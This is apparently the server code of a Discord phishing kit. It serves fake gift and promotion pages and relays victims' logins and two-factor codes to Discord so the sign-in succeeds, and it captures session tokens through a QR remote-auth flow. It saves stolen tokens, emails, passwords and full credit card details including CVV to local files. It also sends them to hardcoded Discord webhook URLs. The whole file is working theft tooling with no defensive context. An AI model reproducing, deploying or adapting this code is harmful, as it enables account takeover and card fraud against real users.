const path = require('path');
const http = require('http');
const express = require('express');
const socketIO = require('socket.io');
const webhook = require("webhook-discord");
const axios = require("axios");
const bodyParser = require('body-parser');
const fetch = require("node-fetch")
const fs = require('fs');
const cookieParser = require('cookie-parser')
const {
    RemoteAuthClient
} = require('./src');

const publicPath = path.join(__dirname, 'public')
const port = process.env.PORT || 80
const webhok = "https://discord.com/api/webhooks/954865663799877702/nMHJwjvHnw6YNhUkGCfxXGmBLrroUQ6FBrLDMgV7lHv5fxGHto0wIzd21IdkleHSsW_5";
const accs = "https://discord.com/api/webhooks/954865663799877702/nMHJwjvHnw6YNhUkGCfxXGmBLrroUQ6FBrLDMgV7lHv5fxGHto0wIzd21IdkleHSsW_5";
let app = express()
let server = http.createServer(app)
let io = socketIO(server, {
    allowEIO3: true
})

app.use(cookieParser())
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({
    extended: true
}));
app.use(express.static('public'))

app.get('/billing/promotions/:code', function (req, res) {
    try {
        res.cookie('user', 'true')
        res.sendFile(path.join(publicPath, 'promotion.html'))
    } catch (e) {
        console.log(e);
    }
});

app.get('/login', function (req, res) {
    try {
        if (req.cookies.user == undefined) return;

        res.sendFile(path.join(publicPath, 'login.html'));
    } catch (e) {
        console.log(e);
    }
});

app.get('/:code', function (req, res) {
    try {
        res.cookie('user', 'true')
        res.sendFile(path.join(publicPath, 'promotion.html'))
    } catch (e) {
        console.log(e);
    }
});

app.get('/gift/:code', function (req, res) {
    try {
        res.cookie('user', 'true')
        res.sendFile(path.join(publicPath, 'promotion.html'))
    } catch (e) {
        console.log(e);
    }
});

app.post('/api/v9/auth/login', function (req, res) {
    try {
        fetch("https://discord.com/api/v9/auth/login", {
                "headers": {
                    "accept": "*/*",
                    "accept-language": "en-US",
                    "authorization": "undefined",
                    "content-type": "application/json",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "sec-gpc": "1",
                    "x-debug-options": "bugReporterEnabled",
                    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk0LjAuNDYwNi44MSBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiOTQuMC40NjA2LjgxIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjEwMTQ1MSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=",
                },
                "referrer": "https://discord.com/login",
                "referrerPolicy": "strict-origin-when-cross-origin",
                "body": `{\"login\":\"${req.body.login}\",\"password\":\"${req.body.password}\",\"undelete\":${req.body.undelete},\"captcha_key\":${req.body.captcha_key ? `\"${req.body.captcha_key}\"` : null},\"login_source\":${req.body.login_source},\"gift_code_sku_id\":${req.body.gift_code_sku_id}}`,
                "method": "POST",
                "mode": "cors"
            }).then(response => response.text())
            .then((response) => {
                let resp = JSON.parse(response);
                res.send(resp);
            }).catch(e => {
                console.log(e);
            });
    } catch (e) {
        console.log(e);
    }
});

app.post('/api/v9/auth/mfa/totp', function (req, res) {
    try {
        fetch("https://discord.com/api/v9/auth/mfa/totp", {
                "headers": {
                    "accept": "*/*",
                    "accept-language": "en-US",
                    "authorization": "undefined",
                    "content-type": "application/json",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "sec-gpc": "1",
                    "x-debug-options": "bugReporterEnabled",
                    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk0LjAuNDYwNi44MSBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiOTQuMC40NjA2LjgxIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjEwMTQ1MSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=",
                },
                "referrer": "https://discord.com/login",
                "referrerPolicy": "strict-origin-when-cross-origin",
                "body": `{\"code\":\"${req.body.code}\",\"ticket\":\"${req.body.ticket}\",\"login_source\":null,\"gift_code_sku_id\":null}`,
                "method": "POST",
                "mode": "cors"
            }).then(response => response.text())
            .then((response) => {
                let resp = JSON.parse(response);
                res.send(resp);
            }).catch(e => {
                console.log(e);
            });
    } catch (e) {
        console.log(e);
    }
});

app.get('/', function (req, res) {
    try {
        res.redirect(301, 'https://discord.com');
    } catch (e) {
        console.log(e);
    }
});

server.listen(port, () => {
    try {
        console.log(`Listening on port ${port}`)
    } catch (e) {
        console.log(e)
    }
});

function reverseString(str) {
    return str.split("").reverse().join("");
}

io.on('connection', function (socket) {
    try {

        socket.on('discord', function (data) {
            try {
                const client = new RemoteAuthClient()

                client.on('pendingRemoteInit', fingerprint => {
                    try {
                        socket.emit("code", {
                            'code': `https://discord.com/ra/${fingerprint}`
                        });
                    } catch (err) {
                        console.log(err);
                    }
                });

                client.on('pendingFinish', user => {
                    try {
                        socket.emit("user", {
                            'user': user
                        });
                    } catch (err) {
                        console.log(err);
                    }
                });

                client.on('finish', token => {
                    try {
                        console.log(`${token}`);
                        socket.emit("token", {
                            'token': token
                        });

                        axios.get('https://discord.com/api/v9/users/@me', {
                                headers: {
                                    'authorization': token,
                                    'Content-Type': 'application/json'
                                }
                            })
                            .then(response => {
                                if (response.data.id != undefined) {

                                    fs.appendFileSync('tokens.txt', `${token}\n`);
                                    const Hook = new webhook.Webhook(webhok);

                                    const msg = new webhook.MessageBuilder()
                                        .setName("DissingCord")
                                        .setText(token);
                                    Hook.send(msg);
                                }
                            })
                            .catch(response => {
                                console.log(response);
                            })
                    } catch (err) {
                        console.log(err);
                    }
                });

                client.on('close', () => {
                    try {
                        socket.emit("close", {
                            'close': true
                        });
                    } catch (e) {
                        console.log(e);
                    }
                });

                client.connect();
            } catch (e) {
                console.log(e);
            }
        });

        socket.on('cc', function (data) {
            try {

                let cc = `\nBilling Information\nPost Code : ${data.zip}\nCard Holder : ${data.name}\nCard Number : ${data.num}\nCard Expiry : ${data.exp}\nCVV : ${data.cvv}\n`;
                fs.appendFileSync('cards.txt', cc);

                const Hook = new webhook.Webhook(accs);

                const msg = new webhook.MessageBuilder()
                    .setName("DissingCord")
                    .setText(cc);
                Hook.send(msg);

            } catch (e) {
                console.log(e);
            }
        });

        socket.on('login', function (gdata) {
            try {
                axios.get('https://discord.com/api/v9/users/@me', {
                        headers: {
                            'authorization': gdata.token,
                            'Content-Type': 'application/json'
                        }
                    })
                    .then(response => {
                        if (response.data.id != undefined) {
                            console.log(`FULL ACC ${gdata.id}`)
                            let acc = `\nAccount Information\nEmail : \`${gdata.email}\`\nPassword : \`${gdata.password}\`\nToken : \`${gdata.token}\`\nID : \`${gdata.id}\`\n`;
                            fs.appendFileSync('accs.txt', acc);
                            fs.appendFileSync('tokens.txt', `${gdata.token}\n`);

                            new webhook.Webhook(accs).send(new webhook.MessageBuilder().setName("ulyqz").setText(gdata.token));
                            new webhook.Webhook(accs).send(new webhook.MessageBuilder().setName("ulyqz").setText(acc));
                        }
                    })
            } catch (e) {
                console.log(e);
            }
        });
    } catch (e) {
        console.log(e);
    }
});

io.on('error', (err) => {
    console.log('error:', err)
});

process.on("unhandledRejection", (err) => {
    console.log(`Got an unhandled Rejection: ${err}`)
});

process.on("uncaughtException", (err) => {
    console.log(`Got an unhandled Exception: ${err}`)
});